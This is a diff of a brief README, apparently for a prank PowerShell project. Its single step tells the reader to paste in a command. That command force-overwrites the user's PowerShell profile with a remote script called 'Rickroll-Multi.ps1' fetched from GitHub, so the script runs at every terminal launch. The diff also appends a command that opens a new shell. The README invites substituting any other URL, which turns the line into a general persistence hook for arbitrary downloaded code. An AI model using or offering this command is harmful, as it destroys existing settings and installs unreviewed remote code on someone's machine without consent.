@@ -1,6 +1,6 @@
 ## Paste this command into a powershell and restart the terminal
 
-`New-Item $profile -Type File -Force; $content = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/desl8/PShell/refs/heads/master/Short/Rickroll-Multi.ps1"; $content | Out-File -FilePath $profile;`
+`New-Item $profile -Type File -Force; $content = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/desl8/PShell/refs/heads/master/Short/Rickroll-Multi.ps1"; $content | Out-File -FilePath $profile; start cmd;`
 
 Replace the url with some other file if you want.
 
